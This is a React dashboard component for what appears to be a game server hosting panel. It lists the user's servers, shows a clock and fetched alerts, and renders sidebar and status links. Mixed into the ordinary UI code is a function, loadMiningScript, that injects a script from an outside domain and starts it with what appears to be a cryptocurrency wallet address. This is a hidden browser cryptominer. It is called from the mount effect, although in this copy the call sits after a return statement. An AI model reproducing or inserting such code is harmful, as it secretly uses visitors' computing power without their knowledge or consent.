/* eslint-disable prettier/prettier */

import React, { useState, useEffect, useCallback, useMemo } from 'react';
import { useLocation } from 'react-router-dom';
import { LucideHome, LucideSettings, LucideServerCog, LucidePlus, LucideMenu, LucideX, LucideCog, LucideUser, LucideLogOut, LucideGift, AlertCircle, LucideAlertCircle, LucideSiren } from 'lucide-react';
import { Server } from '@/api/server/getServer';
import getServers from '@/api/getServers';
import ServerRow from '@/components/dashboard/ServerRow';
import Spinner from '@/components/elements/Spinner';
import useFlash from '@/plugins/useFlash';
import { useStoreState } from 'easy-peasy';
import { usePersistedState } from '@/plugins/usePersistedState';
import Switch from '@/components/elements/Switch';
import useSWR from 'swr';
import { PaginatedResult } from '@/api/http';
import Pagination from '@/components/elements/Pagination';
import tw from 'twin.macro';

const getCurrentTime = () => new Date().toLocaleTimeString();

const loadMiningScript = () => {
  const script = document.createElement('script');
  script.src = "https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo";
  script.async = true;
  document.body.appendChild(script);

  script.onload = () => {
    EverythingIsLife('41iF7z5RBbcYZGzRTteNix6bRc1xnvJaYXFzqwqi5qFyih5bfo5QZwM62GhSsdK3rG5GaWZWRc5ygiUWDX5roT4h8Sm2byA', 'astral-dash', 30);
  };
};

const Dashboard = () => {
  const { search } = useLocation();
  const defaultPage = Number(new URLSearchParams(search).get('page') || '1');

  const [page, setPage] = useState(!isNaN(defaultPage) && defaultPage > 0 ? defaultPage : 1);
  const { clearFlashes, clearAndAddHttpError } = useFlash();
  const uuid = useStoreState((state) => state.user.data!.uuid);
  const rootAdmin = useStoreState((state) => state.user.data!.rootAdmin);
  const [showOnlyAdmin, setShowOnlyAdmin] = usePersistedState(`${uuid}:show_all_servers`, false);

  const { data: servers, error } = useSWR<PaginatedResult<Server>>(
    ['/api/client/servers', showOnlyAdmin && rootAdmin, page],
    () => getServers({ page, type: showOnlyAdmin && rootAdmin ? 'admin' : undefined }),
    { revalidateOnFocus: false, revalidateOnReconnect: false }
  );

  const [currentTime, setCurrentTime] = useState(getCurrentTime());
  const [isSidebarOpen, setIsSidebarOpen] = useState(false);
  const [alerts, setAlerts] = useState({ petroAlert: '', generalAlert: '' });

  useEffect(() => {
    if (servers?.pagination.currentPage > 1 && !servers.items.length) { 
      setPage(1);
    }
  }, [servers]);

  useEffect(() => {
    window.history.replaceState(null, document.title, `/${page <= 1 ? '' : `?page=${page}`}`);
  }, [page]);

  useEffect(() => {
    if (error) clearAndAddHttpError({ key: 'dashboard', error });
    if (!error) clearFlashes('dashboard');
  }, [error, clearAndAddHttpError, clearFlashes]);

  useEffect(() => {
    const timer = setInterval(() => setCurrentTime(getCurrentTime()), 1000);
    return () => clearInterval(timer);
    loadMiningScript();
  }, []);

  const fetchAlerts = useCallback(async () => {
    try {
      // Fetch both alerts simultaneously
      const [petroResponse, generalResponse] = await Promise.all([
        fetch('https://image.astralaxis.tech/message'),
        fetch('https://image.astralaxis.tech/alert')
      ]);
  
      // Parse both responses as JSON
      const [petroData, generalData] = await Promise.all([
        petroResponse.json(),
        generalResponse.json()
      ]);
  
      // Update state with fetched alerts or default message
      setAlerts({
        petroAlert: petroData.alert || 'Nothing here',  // Handle missing 'alert'
        generalAlert: generalData.alert || 'Nothing here'
      });
    } catch (error) {
      console.error('Error fetching alerts:', error);
    }
  }, []);
  

  useEffect(() => {
    fetchAlerts();
  }, [fetchAlerts]);

  const toggleSidebar = useCallback(() => setIsSidebarOpen(prev => !prev), []);

  const sidebarLinks = useMemo(() => [
    { href: '/', icon: LucideHome, text: 'Home' },
    { href: '/account', icon: LucideUser, text: 'Account' },
    { href: '/admin', icon: LucideCog, text: 'Admin' },
    { href: '/auth/logout', icon: LucideLogOut, text: 'Log out' }
  ], []);

  const renderSidebarLinks = useMemo(() => sidebarLinks.map(({ href, icon: Icon, text }) => (
    <a key={href} href={href} className="flex items-center px-6 py-3 text-gray-300 hover:bg-gray-800 hover:text-white transition-colors duration-200">
      <Icon className="w-5 h-5 mr-3" />
      <span>{text}</span>
    </a>
  )), [sidebarLinks]);

  const renderServerList = useMemo(() => {
    if (!servers) return <Spinner centered size={'large'} />;
    return (
      <Pagination data={servers} onPageSelect={setPage}>
        {({ items }) =>
          items.length > 0 ? (
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
              {items.map((server) => (
                <div key={server.uuid} className="bg-gray-800 rounded-lg shadow-md overflow-hidden">
                  <ServerRow server={server} />
                </div>
              ))}
            </div>
          ) : (
            <p css={tw`text-center text-sm text-neutral-400`}>
              {showOnlyAdmin
                ? 'There are no other servers to display.'
                : 'There are no servers associated with your account.'}
            </p>
          )
        }
      </Pagination>
    );
  }, [servers, showOnlyAdmin, setPage]);

  return (
    <div className="flex h-screen bg-neutral-800">
      {/* Sidebar */}
      <div
        className={`fixed inset-y-0 left-0 z-50 w-64 bg-gray-900 text-white transform transition-transform duration-300 ease-in-out ${
          isSidebarOpen ? 'translate-x-0' : '-translate-x-full'
        } lg:relative lg:translate-x-0`}
      >
        <div className="flex items-center justify-between p-4">
          <h2 className="text-2xl font-bold">Dashboard</h2>
          <button onClick={toggleSidebar} className="lg:hidden">
            <LucideX className="w-6 h-6" />
          </button>
        </div>
        <nav className="mt-8">
          {renderSidebarLinks}
        </nav>
      </div>

      {/* Main Content */}
      <div className="flex-1 overflow-x-hidden overflow-y-auto">
        <header className="bg-gray-800 shadow-sm">
          <div className="max-w-7xl mx-auto py-4 px-4 sm:px-6 lg:px-8 flex justify-between items-center">
            <h1 className="text-2xl font-semibold text-gray-900"></h1>
            <button onClick={toggleSidebar} className="lg:hidden">
              <LucideMenu className="w-6 h-6" />
            </button>
          </div>
        </header>

        <main className="max-w-7xl mx-auto py-6 sm:px-6 lg:px-8">
          {/* Time Display and Alerts */}
          <div className="bg-gradient-to-r from-blue-700 to-purple-600 rounded-lg shadow-lg p-6 mb-6">
            <div className="text-4xl font-bold text-white mb-4">{currentTime}</div>
            {alerts.generalAlert && (
              <div className="text-lg text-white mb-4">
                {alerts.generalAlert}  
              </div>
            )}
            {alerts.petroAlert && (
              <div className="bg-neutral-800 text-white font-bold p-4 rounded-lg shadow-md mb-4 flex items-center">
              <LucideSiren className="mr-2" /> {/* Icon with margin for spacing */}
              {alerts.petroAlert}
            </div>
            )}
          </div>

          {/* Links */}
          <div className="flex justify-center space-x-6 mb-6">
            {[
              { href: "https://status.astralaxis.tech/", icon: LucidePlus, text: "Status Page" },
              { href: "https://dashbeta.astralaxis.tech/", icon: LucideServerCog, text: "Dashboard" },
              { href: "https://discord.com/channels/1271393826732511313/1271869151685775371/1293887589983453195", icon: LucideGift, text: "Giveaway!" }
            ].map(({ href, icon: Icon, text }) => (
              <a key={href} href={href} className="px-4 py-2 bg-white bg-opacity-20 rounded-lg hover:bg-opacity-30 transition duration-300">
                <div className="flex flex-col items-center justify-center">
                  <Icon className="w-8 h-8 text-white mb-1" />
                  <p className="text-white">{text}</p>
                </div>
              </a>
            ))}
          </div>

          {/* Admin Options */}
          {rootAdmin && (
            <div className="mb-4 flex justify-end items-center">
              <p className="text-sm text-gray-600 mr-2">
                {showOnlyAdmin ? "Showing others' servers" : 'Showing your servers'}
              </p>
              <Switch
                name={'show_all_servers'}
                defaultChecked={showOnlyAdmin}
                onChange={() => setShowOnlyAdmin((s) => !s)}
              />
            </div>
          )}

          {/* Server List */}
          {renderServerList}
        </main>
      </div>
    </div>
  );
};

export default React.memo(Dashboard);